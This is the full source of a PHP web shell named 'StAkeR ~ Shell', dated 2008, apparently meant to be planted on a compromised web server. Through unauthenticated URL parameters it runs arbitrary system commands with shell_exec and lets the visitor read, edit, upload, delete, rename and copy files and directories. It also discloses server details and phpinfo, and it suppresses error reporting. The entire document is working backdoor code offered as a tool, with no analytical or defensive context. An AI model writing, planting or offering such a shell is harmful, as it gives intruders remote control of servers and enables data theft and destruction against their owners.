<?php
error_reporting(0);
?>
<html>
<head>
<title>StAkeR ~ Shell</title>
<style type="text/css">
body
{
background-color: #E4E4E4;
color: #000000;
font-family: verdana;
font-size: 11px;
cursor: default;
}
table
{
background-color: #888888;
color: #000000;
font-family: verdana;
font-size: 10px;
cursor: default;
border-spacing: 1px;
margin-left: auto;
margin-right: auto;
width: 600px;
}
td
{
background-color: #E4E4E4;
}
a:link,a:visited,a:active
{
font-family: verdana;
font-size: 10px;
text-decoration: none;
color: #000000;
cursor: default;
}
a:hover
{
color: #FFFFFF;
}
input
{
background-color: #E4E4E4;
font-family: verdana;
font-size: 10px;
border: solid 1px #888888;
cursor: default;
}
#head
{
background-color: #888888;
color: #FFFFFF;
text-align: left;
font-weight: bold;
}
pre
{
background-color: #FFFFFF;
text-align: left;
}
#l
{
color: #FFFFFF;
}
#l:hover
{
color: #E4E4E4;
}
#g
{
color: #000000;
}
#g:hover
{
color: #FFFFFF;
}
</style>
</head>
<body>
<?php

// Info.

$ip = $_SERVER['REMOTE_ADDR'];
$ua = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
$shell = $_SERVER['SCRIPT_FILENAME'];
$server = $_SERVER['SERVER_ADDR'];
$phpinfo = $_GET['php_info'];
$remove_file = $_GET['rfile'];
$sname = $_SERVER['SERVER_NAME'];
$file = $_SERVER['PHP_SELF'];
$exec = stripslashes($_GET['exec']);
$vfile = $_GET['vfile'];
$dir = $_GET['dir'];
$working = getcwd();
$fedit = $_GET['fedit'];
$uname = exec("uname -a");
$soft = $_SERVER['SERVER_SOFTWARE'];
$frename = $_GET['frename'];
$nrename = $_GET['nrename'];
$fcopy = $_GET['fcopy'];
$rcopy = $_GET['rcopy'];
$reload = "<script>location.href='$file'</script>";
$mkdir = $_GET['mkdir'];
$rmdir = $_GET['rmdir'];

// PHP INFO

if($phpinfo == 1) {
phpinfo();
die();
}

echo <<<ONE

<table name="info">

<td id="head">
<a href=$file id="l">StAkeR</a> - SHELL
<a href="#" onClick="javascript:history.back(-1)" id="g"><-</a>
<a href="#" onClick=\"javascript:history.back(+1)\" id=\"g\">></a>
</td>
<tr><td>Shell in: $shell</td></tr>
<tr><td>Uname -a: $uname</td></tr>
<tr><td>Server Address: $server</td></tr>
<tr><td>Server Name: $sname</td></tr>
<tr><td>Server Type: $soft</td></tr>
<tr><td>IP Address: $ip</td></tr>
<tr><td>User Agent: $ua</td></tr>
<tr><td>PHPInfo: <a href=$file?php_info=1>Here</a></td></tr>


<form method="get" action=$file>
<tr><td>
Delete File:&nbsp;&nbsp;
<input type="text" name="rfile">
<input type="submit" value="Delete">
</td></tr>
</form>

<form method="get" action=$file>
<tr><td>
Delete Dir:&nbsp;&nbsp;&nbsp;
<input type="text" name="rmdir">
<input type="submit" value="Delete">
</td></tr>
</form>

<form method="get" action=$file>
<tr><td>
Read File:&nbsp;&nbsp;&nbsp;&nbsp;
<input type="text" name="vfile">
<input type="submit" value="Read">
</td></tr>
</form>

<form method="get" action=$file>
<tr><td>
Create Dir: &nbsp;&nbsp;
<input type="text" name="mkdir">
<input type="submit" value="Create">
</tr></td>
</form>


<form enctype="multipart/form-data" method="post" action=$file>
<tr><td>
Upload File:&nbsp;
<input type="file" name="upload">
<input type="submit" value="Upload">
</tr></td>
</form>

<form method="get" action=$file>
<tr><td>
Shell Exec:&nbsp;&nbsp;&nbsp;
<input type="text" name="exec">
<input type="submit" value="Exec">
</tr></td>
</form>

<form method="get" action=$file>
<tr><td>
F Rename:&nbsp;&nbsp;&nbsp;
<input type="text" name="frename">
<input type="text" name="nrename">
<input type="submit" value="Rename">
</tr></td>
</form>

<form method="get" action=$file>
<tr><td>
File Copy:&nbsp;&nbsp;&nbsp;&nbsp;
<input type="text" name="fcopy">
<input type="text" name="rcopy">
<input type="submit" value="Copy">
</tr></td>
</form>

</table><br>

<table><td id="head">
<a href=$file id="l">StAkeR</a> - SHELL </a>
<a href="#" onClick="javascript:history.back(-1)" id="g"><-</a>
<a href="#" onClick="javascript:history.back(+1)" id="g">></a></td>


ONE;
   

// File List,Recursive!

if(isset($dir))
{
chdir($dir);
}
foreach (glob("*") as $files)
{
$perms = substr(sprintf('%o', fileperms($files)), -4);

if(is_file($files))
{
  if(isset($dir))
  {
   echo "<tr><td><a href=$dir/$files>$files</a></td>";
   echo "<td><a href=$file?rfile=$dir/$files>Remove</a></td>";
   echo "<td><a href=$file?vfile=$dir/$files>View</a></td>";
   echo "<td><a href=$file?fedit=$dir/$files>Edit</a></td>";
   echo "<td><a href=$file>$perms</td></tr>";
  }
  else
  {
   echo "<tr><td><a href=$files>$files</a></td>";
   echo "<td><a href=$file?rfile=$files>Remove</a></td>";
   echo "<td><a href=$file?vfile=$files>View</a></td>";
   echo "<td><a href=$file?fedit=$files>Edit</a></td>";
   echo "<td><a href=$file>$perms</td></tr>";
  }
}

if(is_dir($files))
{
  if(isset($dir))
  {
   echo "<tr><td><a href=$files>$files</td>";
   echo "<td><a href=$file?rmdir=$dir/$files>Remove</a></td>";
   echo "<td><a href=$file?dir=$dir/$files>Chdir</td><td>Directory</td>";
   echo "<td><a href=$file>$perms</td></tr>";
  }
  else
  {
   echo "<tr><td><a href=$files>$files</a></td>";
   echo "<td><a href=$file?rmdir=$files>Remove</a></td>";
   echo "<td><a href=$file?dir=$files>Chdir</td><td>Directory</td>";
   echo "<td><a href=$file>$perms</td></tr>";
  }
}
}   
   echo "</table>";
   
   
   
   // Remove File

if(isset($remove_file) and is_writable($remove_file))
{
  if(unlink($remove_file))
  {
    echo "<script>alert('File Deleted')</script>";
    echo $reload;
  }
  else
  {
    echo "<script>alert('File Not Deleted')</script>";
  }
}

// Upload File

if(isset($_FILES['upload']))
{
  $tmp = $_FILES['upload']['tmp_name'];
  $up = basename($_FILES['upload']['name']);

  if(move_uploaded_file($tmp,$up))
  {
    echo "<script>alert('File Uploaded with Succesfull ($up)')</script>";
  }
  else
  {
   echo "<script>alert('File Not Uploaded')</script>";
  }
}

// Command Execute

if(isset($exec))
{
  $execute = shell_exec($exec);

  if($execute)
  {
   echo "<script>alert('Executed')</script>";
  }
}

// View File

if(isset($vfile) and is_readable($vfile))
{
echo "<pre>".htmlentities(file_get_contents($vfile))."</pre>";
 
}

// Edit File

if(isset($fedit) and is_writable($fedit))
{
  $text = htmlspecialchars(join(file($fedit)));

  echo "<form method=\"post\" action=$file?fedit=$fedit>";
  echo "<br><center>";
  echo "<textarea rows=\"25\" cols=\"50\" name=\"text\">$text</textarea>";
  echo "<br><input type=\"submit\" value=\"Edit File\"></form></center>";

if(file_exists($fedit))
{
  $writez =fopen($fedit,'w+');
  $new_text = stripslashes($_POST['text']);
  fwrite($writez,$new_text);
  fclose($writez);
}
}


// Rename File or Directory

if(file_exists($frename) and isset($frename) and !file_exists($nrename))
{
  rename($frename,$nrename);
  echo "<script>alert('Done')</script>";
  echo $reload;
}

// Copy File

if(file_exists($fcopy) and isset($rcopy) and !file_exists($rcopy) and is_file($fcopy))
{
  copy($fcopy,$rcopy);
  echo "<script>alert('Done')</script>";
  echo $reload;
}

// Create Directory

if(isset($mkdir))
{
  if(mkdir($mkdir))
  {
    echo "<script>alert('Directory Created')</script>";
    echo $reload;
   
  }
}

// Remove Directory

if(isset($rmdir))
{
  if(rmdir($rmdir))
  {
    echo "<script>alert('Directory Deleted')</script>";
    echo $reload;
   
  }
}

// Author: StAkeR ~ StAkeR@hotmail.it
// v.0.1 ~ 24 Jul 2008

?>
</body>
</html>
